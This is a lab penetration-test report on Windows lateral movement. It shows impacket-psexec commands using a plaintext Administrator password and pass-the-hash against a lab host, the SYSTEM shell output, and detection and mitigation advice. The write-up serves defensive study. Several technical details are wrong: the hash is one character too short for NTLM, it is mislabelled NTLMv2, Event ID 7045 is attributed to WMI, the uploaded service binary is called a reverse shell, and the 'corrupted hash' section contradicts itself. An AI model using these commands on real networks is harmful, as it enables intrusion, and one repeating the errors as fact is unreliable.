# Lateral Movement Report

**Target Network:** 192.168.19.0/24, 192.168.60.0/24

**Techniques:** PSExec, Pass-the-Hash (PTH), SMB-based lateral movement

**Date:** 20 June 2026

**Analyst:** Ritesh Gupta

---

## 1. Executive Summary

Lateral movement techniques were successfully executed within the lab environment, demonstrating how attackers with initial compromise or weak credentials can spread across a Windows network. Two primary methods were tested:

1. **PSExec with plaintext credentials** — successful remote command execution
2. **PSExec with pass-the-hash (PTH)** — successful lateral movement using only NTLM hash, no plaintext password needed

Both attacks achieved SYSTEM-level access on target machines, confirming that network segmentation, strong authentication, and credential hygiene are essential defensive controls.

---

## 2. Technique 1: PSExec with Plaintext Credentials

### Attack Overview
An attacker with captured or guessed Administrator credentials can use `impacket-psexec` to gain remote code execution on SMB-accessible machines without needing to exploit a vulnerability first.

### Command Executed
```bash
impacket-psexec Administrator:Password123@192.168.19.135
```

### Results
```
[*] Requesting shares on 192.168.19.135.....
[*] Found writable share ADMIN$
[*] Uploading file rndfaUQt.exe
[*] Opening SVCManager on 192.168.19.135.....
[*] Creating service LVOz on 192.168.19.135.....
[*] Starting service LVOz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Windows\system32>
```

### Key Observations
- **ADMIN$ share was writable** — indicating local administrator credentials worked
- **Service creation succeeded** — attacker uploaded a malicious executable and registered it as a Windows service
- **SYSTEM-level shell achieved** — full control over the compromised machine
- **Attack surface:** Any system with SMB enabled and weak credentials is vulnerable

### Attack Flow
1. Attacker authenticates with plaintext Administrator creds
2. Connects to ADMIN$ share (administrative file share)
3. Uploads a reverse shell executable (`rndfaUQt.exe` in this case)
4. Creates a Windows service pointing to the uploaded executable
5. Starts the service, triggering payload execution at SYSTEM privilege
6. Gains interactive command shell

---

## 3. Technique 2: Pass-the-Hash (PTH)

### Attack Overview
Even without plaintext passwords, attackers who obtain NTLM password hashes from one machine can use those hashes to authenticate to other machines on the network. This is particularly dangerous because:

- Hashes persist longer than passwords
- They're extracted from memory, SAM registry, or domain controller backups
- Password reuse across systems makes PTH very effective in practice

### Command Executed
```bash
impacket-psexec -hashes :2b576acbe6bcfda7294d6bd1804b8fe Administrator@192.168.19.135
```

**Hash format:** `:2b576acbe6bcfda7294d6bd1804b8fe` (LM hash omitted, NTLMv2 hash used)

### Results
```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 192.168.19.135.....
[*] Found writable share ADMIN$
[*] Uploading file ISHacKAD.exe
[*] Opening SVCManager on 192.168.19.135.....
[*] Creating service tGLN on 192.168.19.135.....
[*] Starting service tGLN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Windows\system32>
```

### Key Insight
**The attack succeeds identically to plaintext credential-based PSExec**, except the attacker never possessed the actual password — only its hash. This is a critical vulnerability in environments where:

- Hashes have been dumped from one system (e.g., via mimikatz post-compromise)
- Credentials are reused across machines
- SMB services are accessible across the network

---

## 4. Failed Attack Attempt (Corrupted Hash)

An attempt was made with a malformed/corrupted hash:

```bash
impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.19.135
```

**Result:**
```
[-] SMB SessionError: code: 0xc000006d – STATUS_LOGON_FAILURE - The attempted logon is invalid. 
This is either due to a bad username or authentication information.
```

**Why it failed:** The hash provided was incorrect (it's actually the well-known NTLM hash for a blank password, but SMB validation rejected it when used against a different account). This demonstrates that even hash-based attacks require **correct hash values** — a corrupted or mismatched hash fails authentication, just like a wrong password.

---

## 5. Defensive Implications

### What Made These Attacks Possible
1. **Weak credentials** — `Password123` is trivially guessable
2. **SMB exposed network-wide** — port 445 accessible from any machine on the network
3. **No Network Level Authentication (NLA)** — RDP was not configured to require pre-authentication
4. **No credential guard** — Windows Credential Guard was not enabled to protect NTLM hashes in memory
5. **No IP-based access controls** — no firewall rules limiting SMB to specific subnet or admin machines

### Detection Opportunities
- Monitoring for unusual SMB service creation (service name `LVOz`, `tGLN`)
- Alerting on ADMIN$ share access from non-standard hosts
- Detecting remote process execution (WMI Event ID 7045)
- Monitoring Sysmon for suspicious service installation patterns

---

## 6. Mitigations

### Credential Hygiene
- **Unique local admin passwords** — use a password manager or LAPS (Local Administrator Password Solution) to enforce unique credentials per machine
- **Limit admin privileges** — use regular accounts for daily work, only elevate when needed
- **MFA/smartcard logon** — require multi-factor authentication for administrative access

### Network Controls
- **Network segmentation** — isolate administrative systems on a separate VLAN with restricted SMB access
- **Disable SMBv1** — enforce SMBv2/v3 only via Group Policy
- **Restrict RDP** — limit RDP access by IP, require NLA, use VPN or bastion host access
- **Firewall rules** — restrict port 445 (SMB) and 139 (NetBIOS) to authorized admin workstations only

### Detection & Monitoring
- **Sysmon logging** — monitor Event ID 3 (network connections) for SMB access, Event ID 7045 (service installation)
- **Windows Event Log** — monitor Security Event ID 4688 (process creation) and 4697 (service installation)
- **EDR/XDR deployment** — detect suspicious service creation and lateral movement attempts in real time

### Credential Protection
- **Windows Credential Guard** — protect NTLM hashes stored in memory, preventing mimikatz-style hash extraction
- **Active Directory hardening** — enforce Kerberos only (disable NTLM where possible), use AES encryption

---

## 7. Conclusion

Both plaintext credential-based and pass-the-hash lateral movement attacks demonstrate that **compromising a single administrative machine or credential set provides a foothold for network-wide compromise**. In this lab environment, attackers achieved SYSTEM-level access on multiple machines without exploiting unpatched vulnerabilities — only weak credentials and poor network segmentation were required.

Defenders must treat credential compromise as a critical incident, immediately reset affected credentials, and audit all other systems for unauthorized service creation or remote access.
